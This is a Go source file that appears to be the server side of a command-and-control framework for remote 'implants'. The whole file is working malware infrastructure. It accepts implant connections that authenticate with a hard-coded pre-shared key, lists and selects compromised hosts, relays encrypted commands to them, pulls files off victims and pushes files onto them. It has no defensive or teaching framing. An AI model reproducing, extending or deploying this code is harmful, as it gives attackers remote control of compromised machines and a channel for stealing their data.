package main

import (
	"bufio"
	"crypto/sha256"
	"encoding/base64"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"net"
	"os"
	"os/signal"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"

	encryption "github.com/grines/TCPMacDuoC2/common"
)

const PSK = "thisiscoolthisiscool1234"

type Client struct {
	conn     net.Conn
	id       int
	dir      string // Current directory of the client
	hostname string // Hostname of the client
	ip       string // IP address of the client
}

var (
	clients       = make(map[int]Client)
	clientsLock   = sync.Mutex{}
	clientID      = 0
	currentClient *Client
)

func main() {
	// Initialize logging
	logFile, err := os.OpenFile("application.log", os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0666)
	if err != nil {
		log.Fatal("Failed to open log file:", err)
	}
	defer logFile.Close()

	//log.SetOutput(logFile)
	log.Println("Starting the application")

	// Run Health Checks
	go healthCheckClients()

	// Configuration for ports
	port1 := getEnv("PORT1", "8008")
	port2 := getEnv("PORT2", "8009")

	// Start implant listener
	log.Printf("Starting implant listener on port %s...\n", port1)
	ln, err := net.Listen("tcp", "0.0.0.0:"+port1)
	if err != nil {
		log.Fatalf("Error listening on port %s: %v\n", port1, err)
	}
	defer ln.Close()

	go acceptLoopImplant(ln)

	// Start remote client listener
	log.Printf("Starting remote client listener on port %s...\n", port2)
	ln2, err := net.Listen("tcp", "0.0.0.0:"+port2)
	if err != nil {
		log.Fatalf("Error listening on port %s: %v\n", port2, err)
	}
	defer ln2.Close()

	go acceptLoopRemote(ln2)

	// Handle graceful shutdown
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
	<-sigChan

	log.Println("Shutting down gracefully")
}

func getEnv(key, fallback string) string {
	if value, exists := os.LookupEnv(key); exists {
		return value
	}
	return fallback
}

func healthCheckClients() {
	for {
		time.Sleep(30 * time.Second) // Check every 30 seconds
		clientsLock.Lock()
		for id, client := range clients {
			if !isClientAlive(&client) {
				delete(clients, id)
				log.Printf("Client %d is disconnected and removed\n", id)
			}
		}
		clientsLock.Unlock()
	}
}

func isClientAlive(client *Client) bool {
	pingCommand := "ping"

	// Encrypt the ping command
	encryptedCommand, err := encryption.Encrypt(pingCommand, PSK)
	if err != nil {
		log.Println("Error encrypting ping command:", err)
		return false
	}

	// Send the ping command to the client
	_, err = client.conn.Write([]byte(encryptedCommand + "\n"))
	if err != nil {
		log.Println("Error sending ping command:", err)
		return false
	}

	// Wait for a response
	response, err := bufio.NewReader(client.conn).ReadString('\n')
	if err != nil {
		log.Println("Error reading ping response:", err)
		return false
	}

	// Decode the response
	decodedOutput, err := base64.StdEncoding.DecodeString(strings.TrimSpace(response))
	if err != nil {
		log.Println("Error decoding response:", err)
		return false
	}

	// Decrypt and check the response
	decryptedResponse, err := encryption.Decrypt(string(decodedOutput), PSK)
	if err != nil {
		log.Println("Error decrypting ping response:", err)
		return false
	}

	// Check if the response is what we expect (e.g., "pong")
	return decryptedResponse == "pong"
}

func acceptLoopRemote(ln net.Listener) {
	for {
		conn, err := ln.Accept()
		if err != nil {
			log.Println("Error accepting connection on second port:", err)
			continue
		}

		go handleNewConnectionRemote(conn)
	}
}

func handleNewConnectionRemote(conn net.Conn) {
	defer conn.Close()

	reader := bufio.NewReader(conn)
	for {
		// Read a command from the connection
		command, err := reader.ReadString('\n')
		if err != nil {
			if err != io.EOF {
				log.Println("Error reading from connection:", err)
			}
			break
		}
		command = strings.TrimSpace(command)
		log.Println("Received command:", command) // Replaced fmt.Println with log.Println

		decryptedCommand, err := encryption.Decrypt(strings.TrimSpace(command), PSK)
		if err != nil {
			// Handle error
			log.Printf("Error decrypting command: %s", err)
			continue
		}
		log.Printf("Decrypted command received: %s", decryptedCommand)

		if strings.HasPrefix(decryptedCommand, "current") {
			cur := getCurrentClientId()
			curr_string := fmt.Sprintf("%v", cur)
			sendResponseRemote(conn, curr_string)
			continue
		}

		if strings.HasPrefix(decryptedCommand, "select ") {
			handleSelectCommandRemote(decryptedCommand)
			cur := getCurrentClientId()
			curr_string := fmt.Sprintf("%v", cur)
			sendResponseRemote(conn, curr_string)
			continue
		}
		if strings.HasPrefix(decryptedCommand, "list") {
			c := listImplants()
			var lines []string
			for id, client := range c {
				log.Printf(" - Implant ID: %d, Hostname: %s, IP: %s", id, client.hostname, client.ip) // Replaced fmt.Printf with log.Printf
				line := fmt.Sprintf(" - Implant ID: %d, Hostname: %s, IP: %s\n", id, client.hostname, client.ip)
				lines = append(lines, line)
			}
			flattened := strings.Join(lines, "\n")
			sendResponseRemote(conn, flattened)
			continue
		}
		if strings.HasPrefix(decryptedCommand, "download") {
			fmt.Println("We dl")
			resp := handleImplantCommand(currentClient, command)
			fmt.Println(resp)
			saveFile(command, resp)
		}
		if currentClient == nil {
			sendResponseRemote(conn, "No implant selected")
			continue
		}

		resp := handleImplantCommand(currentClient, command)

		sendResponseRemote(conn, resp)
	}
}

func sendResponseRemote(conn net.Conn, response string) {
	encryptedOutput, err := encryption.Encrypt(response, PSK)
	if err != nil {
		log.Printf("Error encrypting response: %v", err)
		return
	}

	encodedOutput := base64.StdEncoding.EncodeToString([]byte(encryptedOutput))
	_, err = conn.Write([]byte(encodedOutput + "\n"))
	if err != nil {
		log.Printf("Error sending encrypted response: %v", err)
	}
}

func acceptLoopImplant(ln net.Listener) {
	for {
		conn, err := ln.Accept()
		if err != nil {
			log.Println("Error accepting connection:", err)
			continue
		}

		// Send a challenge
		challenge := "the_challenge19347627"
		conn.Write([]byte(challenge + "\n"))

		// Read the response
		response, err := bufio.NewReader(conn).ReadString('\n')
		if err != nil {
			log.Println("Error reading response:", err)
			conn.Close()
			continue
		}

		// Validate the response
		expectedResponse := generateResponseAuth(challenge, PSK)
		if strings.TrimSpace(response) != expectedResponse {
			log.Println("Authentication failed")
			conn.Close()
			continue
		}

		// Extract the IP address
		addr := conn.RemoteAddr().(*net.TCPAddr)
		ip := addr.IP.String()

		// Try to resolve the hostname
		hostnames, err := net.LookupAddr(ip)
		hostname := ip // Default to IP if hostname resolution fails
		if err == nil && len(hostnames) > 0 {
			hostname = hostnames[0]
		}

		clientsLock.Lock()
		clientID++
		c := Client{conn: conn, id: clientID, hostname: hostname, ip: ip}
		clients[clientID] = c
		clientsLock.Unlock()

		log.Printf("New implant connected: %d, Hostname: %s, IP: %s\n", clientID, hostname, ip)
	}
}

func handleSelectCommandRemote(command string) {
	parts := strings.SplitN(command, " ", 2)
	if len(parts) != 2 {
		log.Println("Invalid select command. Use 'select <implant_id>'")
		return
	}

	id, err := strconv.Atoi(parts[1])
	if err != nil {
		log.Println("Invalid implant ID:", parts[1])
		return
	}

	clientsLock.Lock()
	client, ok := clients[id]
	clientsLock.Unlock()

	if !ok {
		log.Println("No implant with ID:", id)
		return
	}

	currentClient = &client
	log.Printf("Selected implant %d\n", id)
}

func handleImplantCommand(client *Client, command string) string {
	// Send the command to the server
	_, err := client.conn.Write([]byte(command + "\n"))
	if err != nil {
		log.Println("Error sending command:", err)
	}

	// Read the response from the server
	response, err := bufio.NewReader(client.conn).ReadString('\n')
	if err != nil {
		log.Println("Error receiving response:", err)
	}

	// Decode the response
	decodedOutput, err := base64.StdEncoding.DecodeString(strings.TrimSpace(response))
	if err != nil {
		log.Println("Error decoding response:", err)
	}

	// Decrypt the response
	decryptedOutput, err := encryption.Decrypt(string(decodedOutput), PSK)
	if err != nil {
		log.Println("Error decrypting response:", err)
	}

	return string(decryptedOutput)
}

func listImplants() map[int]Client {
	clientsLock.Lock()
	defer clientsLock.Unlock()

	if len(clients) == 0 {
		log.Println("No implants connected.")
		return nil
	}

	log.Println("Connected implants:")
	for id, client := range clients {
		log.Printf(" - Implant ID: %d, Hostname: %s, IP: %s\n", id, client.hostname, client.ip)
	}
	return clients
}

func removeImplant(id int) {
	clientsLock.Lock()
	defer clientsLock.Unlock()

	delete(clients, id)
	log.Printf("Implant %d disconnected\n", id)

	if currentClient != nil && currentClient.id == id {
		currentClient = nil
	}
}

func saveFile(command, content string) {
	parts := strings.Fields(command)
	if len(parts) < 2 {
		log.Println("Invalid download command")
		return
	}

	fileName := parts[1] // Assuming the file name is the second part of the command
	err := ioutil.WriteFile(fileName, []byte(content), 0644)
	if err != nil {
		log.Println("Error saving file:", err)
		return
	}

	log.Printf("File %s downloaded successfully\n", fileName)
}

func handleUpload(client *Client, command string) bool {
	parts := strings.Fields(command)
	if len(parts) != 3 {
		log.Println("Usage: upload <localpath> <remotepath>")
		return false
	}

	localPath, remotePath := parts[1], parts[2]

	fileData, err := ioutil.ReadFile(localPath)
	if err != nil {
		log.Println("Error reading file:", err)
		return false
	}

	encodedData := base64.StdEncoding.EncodeToString(fileData)
	uploadCommand := fmt.Sprintf("upload %s %s", remotePath, encodedData)

	_, err = client.conn.Write([]byte(uploadCommand + "\n"))
	if err != nil {
		log.Println("Error sending upload command:", err)
		return false
	}

	return true
}

// getCurrentClientId remains unchanged
func getCurrentClientId() int {
	if currentClient != nil {
		return currentClient.id
	}
	return -1 // Return -1 or any other value to indicate that no client is currently selected
}

func generateResponseAuth(challenge string, psk string) string {
	// Should be the same implementation as in payload.go
	hash := sha256.Sum256([]byte(challenge + psk))
	return fmt.Sprintf("%x", hash)
}
